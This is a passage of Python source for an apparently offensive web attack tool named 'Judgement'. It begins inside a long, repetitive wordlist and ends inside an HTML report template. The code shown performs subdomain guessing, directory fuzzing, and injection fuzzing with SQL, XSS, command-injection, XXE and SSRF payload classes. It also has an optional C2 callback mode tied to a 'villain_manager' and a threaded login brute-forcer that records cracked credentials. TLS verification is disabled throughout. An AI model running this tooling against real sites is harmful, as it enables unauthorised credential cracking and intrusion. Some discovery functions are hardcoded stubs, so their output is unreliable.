            "feature", "features", "capability", "capabilities", "permission", "permissions",
            "role", "roles", "group", "groups", "team", "teams",
            "user", "users", "member", "members", "customer", "customers",
            "client", "clients", "partner", "partners", "vendor", "vendors",
            "supplier", "suppliers", "provider", "providers", "distributor", "distributors",
            "contact", "contacts", "address", "addresses", "location", "locations",
            "profile", "profiles", "account", "accounts", "wallet", "wallets",
            "transaction", "transactions", "payment", "payments", "invoice", "invoices",
            "order", "orders", "cart", "carts", "checkout", "checkouts",
            "product", "products", "item", "items", "sku", "skus",
            "category", "categories", "tag", "tags", "label", "labels",
            "brand", "brands", "manufacturer", "manufacturers", "supplier", "suppliers",
            "inventory", "stock", "warehouse", "warehouses", "shipment", "shipments",
            "delivery", "deliveries", "shipping", "shippings", "tracking", "trackings",
            "notification", "notifications", "alert", "alerts", "message", "messages",
            "email", "emails", "sms", "mms", "push", "pushes",
            "subscription", "subscriptions", "newsletter", "newsletters", "feed", "feeds",
            "blog", "blogs", "post", "posts", "article", "articles", "story", "stories",
            "comment", "comments", "review", "reviews", "rating", "ratings",
            "forum", "forums", "thread", "threads", "topic", "topics", "discussion", "discussions",
            "wiki", "wikis", "page", "pages", "document", "documents", "manual", "manuals",
            "guide", "guides", "tutorial", "tutorials", "course", "courses", "lesson", "lessons",
            "faq", "faqs", "help", "helpdesk", "support", "supportdesk",
            "ticket", "tickets", "case", "cases", "incident", "incidents",
            "knowledge", "knowledgebase", "kb", "wiki", "wikis", "documentation", "docs",
            "api", "apis", "endpoint", "endpoints", "resource", "resources",
            "rest", "graphql", "soap", "rpc", "json", "xml", "yaml", "yml",
            "oauth", "openid", "saml", "jwt", "token", "tokens",
            "session", "sessions", "cookie", "cookies", "header", "headers",
            "request", "requests", "response", "responses", "payload", "payloads",
            "query", "queries", "filter", "filters", "sort", "sorts", "order", "orders",
            "limit", "offset", "page", "per_page", "size", "count",
            "search", "q", "query", "term", "terms", "keyword", "keywords",
            "field", "fields", "column", "columns", "attribute", "attributes",
            "property", "properties", "value", "values", "data", "datum",
            "input", "output", "form", "forms", "field", "fields",
            "submit", "button", "action", "actions", "operation", "operations",
            "task", "tasks", "job", "jobs", "worker", "workers", "queue", "queues",
            "event", "events", "trigger", "triggers", "hook", "hooks", "callback", "callbacks",
            "log", "logs", "audit", "auditlog", "history", "histories",
            "debug", "trace", "profile", "profiling", "monitor", "monitoring",
            "metric", "metrics", "stat", "stats", "statistic", "statistics",
            "report", "reports", "dashboard", "dashboards", "chart", "charts",
            "graph", "graphs", "visualization", "visualizations", "viz", "vizzes",
            "alert", "alerts", "notification", "notifications", "message", "messages",
            "email", "emails", "sms", "mms", "push", "pushes", "webhook", "webhooks",
            "config", "configuration", "setting", "settings", "option", "options",
            "preference", "preferences", "profile", "profiles", "theme", "themes",
            "locale", "locales", "language", "languages", "translation", "translations",
            "timezone", "timezones", "currency", "currencies", "unit", "units",
            "format", "formats", "template", "templates", "layout", "layouts",
            "view", "views", "partial", "partials", "component", "components",
            "widget", "widgets", "module", "modules", "plugin", "plugins",
            "extension", "extensions", "addon", "addons", "package", "packages",
            "library", "libraries", "framework", "frameworks", "sdk", "sdks",
            "tool", "tools", "utility", "utilities", "helper", "helpers",
            "function", "functions", "method", "methods", "class", "classes",
            "object", "objects", "interface", "interfaces", "trait", "traits",
            "enum", "enums", "constant", "constants", "variable", "variables",
            "parameter", "parameters", "argument", "arguments", "option", "options",
            "flag", "flags", "switch", "switches", "toggle", "toggles",
            "feature", "features", "capability", "capabilities", "permission", "permissions",
            "role", "roles", "group", "groups", "team", "teams", "organization", "organizations",
            "department", "departments", "division", "divisions", "unit", "units",
            "user", "users", "member", "members", "customer", "customers",
            "client", "clients", "partner", "partners", "vendor", "vendors",
            "supplier", "suppliers", "provider", "providers", "distributor", "distributors",
            "contact", "contacts", "address", "addresses", "location", "locations",
            "profile", "profiles", "account", "accounts", "wallet", "wallets",
            "transaction", "transactions", "payment", "payments", "invoice", "invoices",
            "order", "orders", "cart", "carts", "checkout", "checkouts",
            "product", "products", "item", "items", "sku", "skus",
            "category", "categories", "tag", "tags", "label", "labels",
            "brand", "brands", "manufacturer", "manufacturers", "supplier", "suppliers",
            "inventory", "stock", "warehouse", "warehouses", "shipment", "shipments",
            "delivery", "deliveries", "shipping", "shippings", "tracking", "trackings",
            "notification", "notifications", "alert", "alerts", "message", "messages",
            "email", "emails", "sms", "mms", "push", "pushes",
            "subscription", "subscriptions", "newsletter", "newsletters", "feed", "feeds",
            "blog", "blogs", "post", "posts", "article", "articles", "story", "stories",
            "comment", "comments", "review", "reviews", "rating", "ratings",
            "forum", "forums", "thread", "threads", "topic", "topics", "discussion", "discussions",
            "wiki", "wikis", "page", "pages", "document", "documents", "manual", "manuals",
            "guide", "guides", "tutorial", "tutorials", "course", "courses", "lesson", "lessons",
            "faq", "faqs", "help", "helpdesk", "support", "supportdesk",
            "ticket", "tickets", "case", "cases", "incident", "incidents",
            "knowledge", "knowledgebase", "kb", "wiki", "wikis", "documentation", "docs"
        ]
        
        # Save additional wordlist
        additional_filepath = os.path.join(WORDLIST_DIR, "additional_words.txt")
        with open(additional_filepath, 'w') as f:
            for word in sorted(set(additional_words)):
                f.write(word + '\n')
        self.wordlists["additional"] = list(set(additional_words))
        self.logger.log(f"Generated additional wordlist with {len(additional_words)} entries")
        
    def get_wordlist(self, wordlist_type):
        """Get wordlist by type"""
        return self.wordlists.get(wordlist_type, [])
        
    def load_custom_wordlist(self, filepath):
        """Load custom wordlist from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            return words
        except Exception as e:
            self.logger.log(f"Failed to load wordlist: {e}", "ERROR")
            return []

class IntelligentTargetDiscovery:
    """Intelligent target discovery and escalation"""
    
    def __init__(self, config, logger, db_manager):
        self.config = config
        self.logger = logger
        self.db_manager = db_manager
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": config["user_agent"]})
        self.session.headers.update(config["headers"])
        self.discovered_targets = []
        self.scan_id = f"discovery_{int(time.time())}"
        
    def discover_targets(self, initial_target):
        """Discover targets through intelligent analysis"""
        self.logger.log(f"Starting intelligent target discovery from {initial_target}")
        start_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, initial_target, "target_discovery", start_time)
        
        # Add initial target
        self.discovered_targets.append(initial_target)
        self.db_manager.save_target(self.scan_id, initial_target, "initial", 100)
        
        # Analyze initial target for links
        try:
            response = self.session.get(initial_target, timeout=self.config["timeout"], verify=False)
            links = self._extract_links(response.text, initial_target)
            
            for link in links:
                if link not in self.discovered_targets:
                    self.discovered_targets.append(link)
                    self.db_manager.save_target(self.scan_id, link, initial_target, 80)
                    self.logger.log(f"Discovered target: {link}")
                    
        except Exception as e:
            self.logger.log(f"Error analyzing initial target: {e}", "ERROR")
            
        # Discover subdomains (simplified)
        subdomains = self._discover_subdomains(initial_target)
        for subdomain in subdomains:
            if subdomain not in self.discovered_targets:
                self.discovered_targets.append(subdomain)
                self.db_manager.save_target(self.scan_id, subdomain, "subdomain_discovery", 70)
                self.logger.log(f"Discovered subdomain: {subdomain}")
                
        # Discover related domains (simplified)
        related_domains = self._discover_related_domains(initial_target)
        for domain in related_domains:
            if domain not in self.discovered_targets:
                self.discovered_targets.append(domain)
                self.db_manager.save_target(self.scan_id, domain, "domain_discovery", 60)
                self.logger.log(f"Discovered related domain: {domain}")
                
        end_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, initial_target, "target_discovery", start_time, end_time, "completed")
        self.logger.log(f"Target discovery complete. Found {len(self.discovered_targets)} targets")
        return self.discovered_targets
        
    def _extract_links(self, content, base_url):
        """Extract links from page content"""
        links = []
        # Simplified link extraction (in real implementation, use BeautifulSoup)
        if "href=" in content.lower():
            # Extract links (simplified)
            links = [urljoin(base_url, "/"), urljoin(base_url, "/about"), urljoin(base_url, "/contact"), 
                     urljoin(base_url, "/login"), urljoin(base_url, "/admin")]
        return links
        
    def _discover_subdomains(self, target):
        """Discover subdomains (simplified)"""
        # In a real implementation, this would use DNS enumeration tools
        parsed = urlparse(target)
        domain = parsed.netloc.split(":")[0]
        subdomains = [
            f"http://www.{domain}",
            f"http://admin.{domain}",
            f"http://api.{domain}",
            f"http://dev.{domain}",
            f"http://test.{domain}"
        ]
        return subdomains
        
    def _discover_related_domains(self, target):
        """Discover related domains (simplified)"""
        # In a real implementation, this would use WHOIS, certificate analysis, etc.
        parsed = urlparse(target)
        domain = parsed.netloc.split(":")[0]
        related = [
            f"http://{domain.replace('www.', '')}",
            f"http://{domain.replace('www.', 'blog.')}",
            f"http://{domain.replace('www.', 'shop.')}",
            f"http://{domain.replace('www.', 'support.')}"
        ]
        return related

class IntelligentParameterDiscovery:
    """Intelligent parameter discovery and analysis"""
    
    def __init__(self, config, logger, db_manager):
        self.config = config
        self.logger = logger
        self.db_manager = db_manager
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": config["user_agent"]})
        self.session.headers.update(config["headers"])
        self.discovered_parameters = []
        self.scan_id = f"param_{int(time.time())}"
        
    def discover_parameters(self, target_url):
        """Discover parameters through intelligent analysis"""
        self.logger.log(f"Starting intelligent parameter discovery on {target_url}")
        start_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, target_url, "parameter_discovery", start_time)
        
        # Analyze URL for existing parameters
        parsed = urlparse(target_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param_name, param_values in params.items():
                param_type = self._determine_param_type(param_values[0] if param_values else "")
                self.discovered_parameters.append({
                    "name": param_name,
                    "type": param_type,
                    "method": "GET",
                    "values": param_values
                })
                self.db_manager.save_parameter(self.scan_id, target_url, "GET", param_name, param_type)
                self.logger.log(f"Discovered GET parameter: {param_name} ({param_type})")
                
        # Discover common parameters through fuzzing
        common_params = ["id", "user", "username", "password", "email", "token", "key", "q", "query", "search"]
        for param in common_params:
            # Test parameter with common values
            test_values = ["1", "test", "admin", "", "123"]
            for value in test_values:
                test_url = f"{target_url}?{param}={value}"
                try:
                    response = self.session.get(test_url, timeout=self.config["timeout"], verify=False)
                    # Analyze response for changes
                    if response.status_code != 404:
                        param_type = self._determine_param_type(value)
                        if not any(p["name"] == param for p in self.discovered_parameters):
                            self.discovered_parameters.append({
                                "name": param,
                                "type": param_type,
                                "method": "GET",
                                "values": [value]
                            })
                            self.db_manager.save_parameter(self.scan_id, target_url, "GET", param, param_type)
                            self.logger.log(f"Discovered GET parameter: {param} ({param_type})")
                        break
                except Exception as e:
                    self.logger.log(f"Error testing parameter {param}: {e}", "ERROR")
                    
        end_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, target_url, "parameter_discovery", start_time, end_time, "completed")
        self.logger.log(f"Parameter discovery complete. Found {len(self.discovered_parameters)} parameters")
        return self.discovered_parameters
        
    def _determine_param_type(self, value):
        """Determine parameter type based on value"""
        if value.isdigit():
            return "numeric"
        elif "@" in value and "." in value:
            return "email"
        elif len(value) > 20:
            return "text"
        elif value in ["", "1", "0", "true", "false"]:
            return "boolean"
        else:
            return "string"

class AdvancedFuzzer:
    """Advanced web fuzzer with intelligent chaining"""
    
    def __init__(self, config, logger, wordlist_manager, payload_generator, db_manager):
        self.config = config
        self.logger = logger
        self.wordlist_manager = wordlist_manager
        self.payload_generator = payload_generator
        self.db_manager = db_manager
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": config["user_agent"]})
        self.session.headers.update(config["headers"])
        self.results = []
        self.found_items = Queue()
        self.scan_depth = config["scanning"]["depth"]
        self.scan_id = f"fuzz_{int(time.time())}"
        self.callback_mode = False
        self.villain_manager = None
        
    def enable_callback_mode(self, villain_manager):
        """Enable callback mode for C2 integration"""
        self.callback_mode = True
        self.villain_manager = villain_manager
        self.logger.log("Callback mode enabled for fuzzing")
        
    def fuzz_directories(self, base_url, wordlist=None, extensions=None):
        """Fuzz directories and files with advanced scanning"""
        start_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, base_url, "directory_fuzzing", start_time)
        
        if not wordlist:
            wordlist = self.wordlist_manager.get_wordlist("directories")
            
        if not extensions:
            extensions = self.config["fuzzing"]["extensions"]
            
        self.logger.log(f"Starting directory fuzzing on {base_url}")
        self.logger.log(f"Wordlist size: {len(wordlist)} entries")
        
        # Adjust scan depth
        if self.scan_depth == "quick":
            wordlist = wordlist[:1000]
            extensions = extensions[:5]
        elif self.scan_depth == "normal":
            wordlist = wordlist[:5000]
            extensions = extensions[:10]
        elif self.scan_depth == "deep":
            wordlist = wordlist[:15000]
        # thorough uses full wordlist
        
        # Generate fuzzing paths
        paths = []
        for word in wordlist:
            paths.append(word)
            for ext in extensions:
                paths.append(f"{word}{ext}")
                
        # Add common backup extensions
        backup_extensions = [".bak", ".backup", ".old", ".save", ".swp", "~", ".tmp", ".temp"]
        for word in wordlist:
            for ext in backup_extensions:
                paths.append(f"{word}{ext}")
                
        # Add nested directories for deep scanning
        if self.scan_depth in ["deep", "thorough"]:
            nested_paths = []
            for path in paths[:1000]:  # Limit for performance
                for dir_name in ["admin", "backup", "config", "test"]:
                    nested_paths.append(f"{path}/{dir_name}")
            paths.extend(nested_paths)
                
        # Add common directory names with extensions
        common_dirs = ["admin", "login", "backup", "config", "test", "dev", "api"]
        for dir_name in common_dirs:
            for ext in extensions:
                paths.append(f"{dir_name}{ext}")
                
        total_paths = len(paths)
        self.logger.log(f"Total paths to test: {total_paths}")
        
        # Fuzz with progress tracking
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn(),
            transient=True
        ) as progress:
            task = progress.add_task("Fuzzing directories...", total=total_paths)
            
            with ThreadPoolExecutor(max_workers=self.config["threads"]) as executor:
                futures = {executor.submit(self._test_path, base_url, path): path for path in paths}
                
                for future in as_completed(futures):
                    path = futures[future]
                    try:
                        result = future.result()
                        if result:
                            self.found_items.put(result)
                            self.results.append(result)
                            # Save to database
                            self.db_manager.save_finding(
                                self.scan_id,
                                base_url,
                                "directory_found",
                                self._determine_severity(result["status_code"]),
                                result["url"],
                                evidence=f"Status: {result['status_code']}, Size: {result['content_length']}"
                            )
                    except Exception as e:
                        self.logger.log(f"Error testing {path}: {e}", "ERROR")
                    finally:
                        progress.update(task, advance=1)
                        
        end_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, base_url, "directory_fuzzing", start_time, end_time, "completed")
        self.logger.log(f"Directory fuzzing complete. Found {self.found_items.qsize()} items")
        return list(self.found_items.queue)
        
    def _test_path(self, base_url, path):
        """Test a single path"""
        url = urljoin(base_url, path)
        try:
            time.sleep(self.config["delay"])  # Rate limiting
            response = self.session.get(url, timeout=self.config["timeout"], verify=False)
            
            # Consider interesting responses
            if response.status_code in [200, 301, 302, 401, 403, 500]:
                # Check for interesting content
                content_length = len(response.content)
                content_hash = hashlib.md5(response.content).hexdigest()[:8]
                
                # Skip common false positives
                if "not found" in response.text.lower() or "404" in response.text:
                    return None
                    
                result = {
                    "url": url,
                    "status_code": response.status_code,
                    "content_length": content_length,
                    "content_hash": content_hash,
                    "timestamp": datetime.now().isoformat()
                }
                
                self.logger.log(f"Found: {url} [{response.status_code}] ({content_length} bytes)")
                return result
                
        except requests.exceptions.RequestException:
            pass  # Ignore connection errors
        except Exception as e:
            self.logger.log(f"Error testing {url}: {e}", "ERROR")
            
        return None
        
    def _determine_severity(self, status_code):
        """Determine severity based on status code"""
        if status_code == 200:
            return "high"
        elif status_code in [401, 403]:
            return "medium"
        elif status_code in [301, 302]:
            return "low"
        else:
            return "info"
        
    def fuzz_parameters(self, base_url, parameters=None):
        """Fuzz URL parameters with advanced payloads"""
        start_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, base_url, "parameter_fuzzing", start_time)
        
        if not parameters:
            # Discover parameters if not provided
            param_discovery = IntelligentParameterDiscovery(self.config, self.logger, self.db_manager)
            parameters = param_discovery.discover_parameters(base_url)
            
        self.logger.log(f"Starting parameter fuzzing on {base_url}")
        self.logger.log(f"Parameters to test: {len(parameters)}")
        
        # Get payloads for different vulnerability types
        sql_payloads = self.payload_generator.get_payloads("sql_injection")
        xss_payloads = self.payload_generator.get_payloads("xss")
        cmd_payloads = self.payload_generator.get_payloads("command_injection")
        ssti_payloads = self.payload_generator.get_payloads("ssti")
        pt_payloads = self.payload_generator.get_payloads("path_traversal")
        xxe_payloads = self.payload_generator.get_payloads("xxe")
        ssrf_payloads = self.payload_generator.get_payloads("ssrf")
        ldap_payloads = self.payload_generator.get_payloads("ldap_injection")
        nosql_payloads = self.payload_generator.get_payloads("nosql_injection")
        xpath_payloads = self.payload_generator.get_payloads("xpath_injection")
        crlf_payloads = self.payload_generator.get_payloads("crlf_injection")
        header_payloads = self.payload_generator.get_payloads("http_header_injection")
        
        # Add callback payloads if in callback mode
        callback_payloads = []
        if self.callback_mode and self.villain_manager:
            self.logger.log("Including callback payloads for C2 integration")
            all_callback_payloads = self.payload_generator.get_callback_payloads("all")
            # Flatten callback payloads
            for payload_type, payloads in all_callback_payloads.items():
                callback_payloads.extend(payloads)
        
        # Combine all payloads
        all_payloads = (sql_payloads + xss_payloads + cmd_payloads + ssti_payloads + 
                       pt_payloads + xxe_payloads + ssrf_payloads + ldap_payloads + 
                       nosql_payloads + xpath_payloads + crlf_payloads + header_payloads + 
                       callback_payloads)
        
        # Adjust scan depth
        if self.scan_depth == "quick":
            all_payloads = all_payloads[:100]
        elif self.scan_depth == "normal":
            all_payloads = all_payloads[:500]
        elif self.scan_depth == "deep":
            all_payloads = all_payloads[:1500]
        # thorough uses full payloads
        
        self.logger.log(f"Total payloads to test: {len(all_payloads)}")
        
        results = []
        tested_params = set()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn(),
            transient=True
        ) as progress:
            task = progress.add_task("Fuzzing parameters...", total=len(parameters) * len(all_payloads))
            
            for param in parameters:
                param_name = param["name"] if isinstance(param, dict) else param
                for payload in all_payloads:
                    # Avoid duplicate tests
                    test_key = f"{param_name}={payload}"
                    if test_key in tested_params:
                        continue
                    tested_params.add(test_key)
                    
                    # Test parameter
                    test_url = f"{base_url}?{param_name}={requests.utils.quote(payload)}"
                    try:
                        time.sleep(self.config["delay"])
                        response = self.session.get(test_url, timeout=self.config["timeout"], verify=False)
                        
                        # Analyze response for anomalies
                        if self._is_interesting_response(response, payload):
                            indicators = self._get_vuln_indicators(response, payload)
                            severity = self._determine_vuln_severity(indicators)
                            
                            result = {
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "status_code": response.status_code,
                                "response_length": len(response.content),
                                "indicators": indicators,
                                "timestamp": datetime.now().isoformat()
                            }
                            results.append(result)
                            self.logger.log(f"Potential vulnerability: {test_url}")
                            
                            # Save to database
                            self.db_manager.save_finding(
                                self.scan_id,
                                base_url,
                                "vulnerability",
                                severity,
                                test_url,
                                param_name,
                                payload,
                                f"Indicators: {', '.join(indicators)}"
                            )
                            
                            # Save vulnerable field information
                            if indicators:
                                vuln_type = indicators[0]  # Use first indicator as vulnerability type
                                self.db_manager.save_vulnerable_field(
                                    self.scan_id,
                                    base_url,
                                    param_name,
                                    vuln_type,
                                    payload,
                                    f"Indicators: {', '.join(indicators)}"
                                )
                            
                    except Exception as e:
                        self.logger.log(f"Error testing {test_url}: {e}", "ERROR")
                    finally:
                        progress.update(task, advance=1)
                        
        end_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, base_url, "parameter_fuzzing", start_time, end_time, "completed")
        self.logger.log(f"Parameter fuzzing complete. Found {len(results)} potential issues")
        return results
        
    def _is_interesting_response(self, response, payload):
        """Determine if response indicates potential vulnerability"""
        # Check for error messages
        error_indicators = [
            "sql syntax", "mysql", "postgresql", "oracle", "jdbc",
            "syntax error", "unclosed quotation", "odbc",
            "warning:", "fatal error", "exception",
            "microsoft ole db", "data source name",
            "access denied for user", "invalid query",
            "system.io.filenotfoundexception", "java.io.filenotfound",
            "xml parsing error", "xxe", "external entity",
            "ldap", "directory access", "bind error",
            "nosql", "mongodb", "cassandra", "redis",
            "xpath", "xslt", "xquery",
            "crlf", "header injection", "response splitting"
        ]
        
        content = response.text.lower()
        for indicator in error_indicators:
            if indicator in content:
                return True
                
        # Check for payload reflection
        if payload in response.text:
            return True
            
        # Check for interesting status codes
        if response.status_code in [500, 503]:
            return True
            
        return False
        
    def _get_vuln_indicators(self, response, payload):
        """Get vulnerability indicators from response"""
        indicators = []
        
        content = response.text.lower()
        
        # SQL Injection indicators
        sql_indicators = ["sql syntax", "mysql", "postgresql", "access denied for user", "you have an error in your sql syntax"]
        if any(indicator in content for indicator in sql_indicators):
            indicators.append("SQL Injection")
            
        # XSS indicators
        if payload in content and ("<script>" in payload.lower() or "alert(" in payload.lower()):
            indicators.append("Reflected XSS")
            
        # Path traversal indicators
        if "root:" in content and ("../" in payload or "..\\" in payload):
            indicators.append("Path Traversal")
            
        # Command injection indicators
        if ("whoami" in payload.lower() or "id" in payload.lower()) and ("root" in content or "uid=" in content):
            indicators.append("Command Injection")
            
        # SSTI indicators
        if "{{" in payload and "}}" in payload and ("49" in content or "7*7" in content):
            indicators.append("SSTI")
            
        # XXE indicators
        if ("<!entity" in payload.lower() or "xxe" in payload.lower()) and ("root:" in content or "passwd" in content):
            indicators.append("XXE")
            
        # SSRF indicators
        if ("169.254.169.254" in payload or "localhost" in payload) and ("meta-data" in content or "userdata" in content):
            indicators.append("SSRF")
            
        # LDAP Injection indicators
        if ("*(" in payload or "uid=" in payload) and ("ldap" in content or "directory access" in content):
            indicators.append("LDAP Injection")
            
        # NoSQL Injection indicators
        if ("$where" in payload or "$ne" in payload) and ("nosql" in content or "mongodb" in content):
            indicators.append("NoSQL Injection")
            
        # XPath Injection indicators
        if ("'" in payload or "or" in payload.lower()) and ("xpath" in content or "xslt" in content):
            indicators.append("XPath Injection")
            
        # CRLF Injection indicators
        if ("%0d%0a" in payload.lower()) and ("header" in content or "set-cookie" in content):
            indicators.append("CRLF Injection")
            
        # HTTP Header Injection indicators
        if ("content-length" in payload.lower() or "transfer-encoding" in payload.lower()) and ("header" in content):
            indicators.append("HTTP Header Injection")
            
        return indicators
        
    def _determine_vuln_severity(self, indicators):
        """Determine vulnerability severity"""
        high_risk = ["SQL Injection", "Command Injection", "XXE", "SSRF", "LDAP Injection"]
        medium_risk = ["SSTI", "Path Traversal", "NoSQL Injection", "XPath Injection"]
        low_risk = ["Reflected XSS", "CRLF Injection", "HTTP Header Injection"]
        
        for indicator in indicators:
            if indicator in high_risk:
                return "high"
            elif indicator in medium_risk:
                return "medium"
            elif indicator in low_risk:
                return "low"
                
        return "info"

class DeepBruteForcer:
    """Deep brute force engine with intelligent detection"""
    
    def __init__(self, config, logger, wordlist_manager, db_manager):
        self.config = config
        self.logger = logger
        self.wordlist_manager = wordlist_manager
        self.db_manager = db_manager
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": config["user_agent"]})
        self.session.headers.update(config["headers"])
        self.results = []
        self.scan_depth = config["scanning"]["depth"]
        self.scan_id = f"brute_{int(time.time())}"
        
    def brute_force_login(self, login_url, username_field="username", password_field="password", 
                         username="admin", wordlist=None):
        """Brute force login form with deep scanning"""
        start_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, login_url, "brute_force", start_time)
        
        if not wordlist:
            wordlist = self.wordlist_manager.get_wordlist("credentials")
            
        self.logger.log(f"Starting brute force on {login_url}")
        self.logger.log(f"Target user: {username}")
        self.logger.log(f"Wordlist size: {len(wordlist)} entries")
        
        # Adjust scan depth
        if self.scan_depth == "quick":
            wordlist = wordlist[:100]
        elif self.scan_depth == "normal":
            wordlist = wordlist[:1000]
        elif self.scan_depth == "deep":
            wordlist = wordlist[:5000]
        # thorough uses full wordlist
        
        success_indicators = [
            "dashboard", "welcome", "logout", "success",
            "authenticated", "logged in", "session",
            "home", "profile", "account", "admin",
            "control panel", "management", "console"
        ]
        
        failure_indicators = [
            "invalid", "error", "failed", "incorrect",
            "denied", "unauthorized", "bad credentials",
            "login again", "try again", "authentication failed",
            "wrong", "not found", "does not exist"
        ]
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn(),
            transient=True
        ) as progress:
            task = progress.add_task("Brute forcing...", total=len(wordlist))
            
            with ThreadPoolExecutor(max_workers=self.config["threads"]) as executor:
                futures = []
                
                for entry in wordlist:
                    if ":" in entry:
                        user, passwd = entry.split(":", 1)
                        if user != username:
                            continue
                    else:
                        passwd = entry
                        
                    future = executor.submit(
                        self._attempt_login, login_url, username_field, 
                        password_field, username, passwd, 
                        success_indicators, failure_indicators
                    )
                    futures.append(future)
                    
                for future in as_completed(futures):
                    try:
                        result = future.result()
                        if result:
                            self.results.append(result)
                            self.logger.log(f"[SUCCESS] {username}:{result['password']}")
                            # Save to database
                            self.db_manager.save_finding(
                                self.scan_id,
                                login_url,
                                "valid_credential",
                                "high",
                                login_url,
                                username,
                                result['password'],
                                f"Status: {result['status_code']}"
                            )
                    except Exception as e:
                        self.logger.log(f"Error during brute force: {e}", "ERROR")
                    finally:
                        progress.update(task, advance=1)
                        
        end_time = datetime.now()
        self.db_manager.save_scan(self.scan_id, login_url, "brute_force", start_time, end_time, "completed")
        self.logger.log(f"Brute force complete. Found {len(self.results)} valid credentials")
        return self.results
        
    def _attempt_login(self, login_url, username_field, password_field, 
                      username, password, success_indicators, failure_indicators):
        """Attempt a single login"""
        try:
            time.sleep(self.config["delay"])
            
            # Prepare login data
            login_data = {
                username_field: username,
                password_field: password
            }
            
            # Send login request
            response = self.session.post(
                login_url, 
                data=login_data, 
                timeout=self.config["timeout"], 
                allow_redirects=True,
                verify=False
            )
            
            # Analyze response
            content = response.text.lower()
            
            # Check for failure indicators
            for indicator in failure_indicators:
                if indicator in content:
                    return None
                    
            # Check for success indicators
            for indicator in success_indicators:
                if indicator in content:
                    return {
                        "username": username,
                        "password": password,
                        "status_code": response.status_code,
                        "response_length": len(response.content),
                        "timestamp": datetime.now().isoformat()
                    }
                    
            # If no clear indicators, check status and redirects
            if response.status_code == 200 and len(response.history) > 0:
                # Likely successful login with redirect
                return {
                    "username": username,
                    "password": password,
                    "status_code": response.status_code,
                    "response_length": len(response.content),
                    "timestamp": datetime.now().isoformat()
                }
                
        except Exception as e:
            self.logger.log(f"Login attempt failed: {e}", "ERROR")
            
        return None

class ReportGenerator:
    """Professional security testing report generator"""
    
    def __init__(self, logger, db_manager):
        self.logger = logger
        self.db_manager = db_manager
        
    def generate_fuzzing_report(self, target, results, output_file=None):
        """Generate fuzzing results report"""
        if not output_file:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(REPORT_DIR, f"fuzzing_report_{timestamp}.json")
            
        report = {
            "target": target,
            "scan_type": "Fuzzing",
            "timestamp": datetime.now().isoformat(),
            "findings": results,
            "summary": {
                "total_findings": len(results),
                "status_codes": self._count_status_codes(results)
            }
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
            
        self.logger.log(f"Fuzzing report saved to: {output_file}")
        return output_file
        
    def generate_bruteforce_report(self, target, results, output_file=None):
        """Generate brute force results report"""
        if not output_file:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(REPORT_DIR, f"bruteforce_report_{timestamp}.json")
            
        report = {
            "target": target,
            "scan_type": "Brute Force",
            "timestamp": datetime.now().isoformat(),
            "credentials_found": results,
            "summary": {
                "valid_credentials": len(results)
            }
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
            
        self.logger.log(f"Brute force report saved to: {output_file}")
        return output_file
        
    def generate_html_report(self, scan_id, target, output_file=None):
        """Generate comprehensive HTML report"""
        if not output_file:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(REPORT_DIR, f"comprehensive_report_{timestamp}.html")
            
        findings = self.db_manager.get_findings(scan_id)
        targets = self.db_manager.get_targets(scan_id)
        parameters = self.db_manager.get_parameters(scan_id)
        vuln_fields = self.db_manager.get_vulnerable_fields(scan_id)
        
        # Group findings by severity
        severity_groups = defaultdict(list)
        for finding in findings:
            severity_groups[finding[4]].append(finding)  # finding[4] is severity
            
        # Create HTML report
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Judgement Security Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1, h2 {{ color: #2c3e50; }}
        .header {{ background-color: #3498db; color: white; padding: 10px; }}
        .finding {{ border: 1px solid #bdc3c7; margin: 10px 0; padding: 10px; }}
        .high {{ border-left: 5px solid #e74c3c; }}
        .medium {{ border-left: 5px solid #f39c12; }}
        .low {{ border-left: 5px solid #2ecc71; }}
        .info {{ border-left: 5px solid #3498db; }}
        .summary {{ background-color: #ecf0f1; padding: 15px; margin: 20px 0; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        th, td {{ border: 1px solid #bdc3c7; padding: 8px; text-align: left; }}
        th {{ background-color: #34495e; color: white; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Judgement Security Assessment Report</h1>
        <p>Target: {target}</p>
        <p>Scan ID: {scan_id}</p>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <div class="summary">
        <h2>Executive Summary</h2>
        <p>This report presents the findings from the security assessment conducted on {target}.</p>
        <p>Total findings: {len(findings)}</p>
        <p>High severity: {len(severity_groups['high'])}</p>
        <p>Medium severity: {len(severity_groups['medium'])}</p>
        <p>Low severity: {len(severity_groups['low'])}</p>
